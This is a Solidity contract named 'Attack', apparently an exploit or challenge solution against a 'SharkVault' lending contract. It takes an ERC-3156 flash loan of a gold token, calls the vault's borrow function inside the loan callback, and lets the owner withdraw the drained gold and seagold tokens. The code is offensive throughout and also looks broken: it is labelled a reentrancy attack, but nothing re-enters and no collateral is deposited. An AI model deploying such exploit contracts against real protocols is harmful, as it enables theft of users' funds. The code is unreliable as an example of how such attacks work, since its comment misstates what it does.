// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "./SharkVault.sol";



interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IERC3156FlashLender {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract Attack is IERC3156FlashBorrower {
    SharkVault public vault;
    IERC3156FlashLender public flashLender;
    IERC20 public gold;
    IERC20 public seagold;

    address public owner;

    constructor(
        address _vault,
        address _flashLender,
        address _gold,
        address _seagold
    ) {
        vault = SharkVault(_vault);
        flashLender = IERC3156FlashLender(_flashLender);
        gold = IERC20(_gold);
        seagold = IERC20(_seagold);
        owner = msg.sender;
    }

    function attack() external {
        bytes memory data = "";
        flashLender.flashLoan(this, address(gold), 100 ether, data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // Approve the repayment of the flash loan
        IERC20(token).approve(address(flashLender), amount + fee);

        // Perform the reentrancy attack simulation
        vault.borrow(10 );

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        gold.transfer(owner, gold.balanceOf(address(this)));
        seagold.transfer(owner, seagold.balanceOf(address(this)));
    }
}
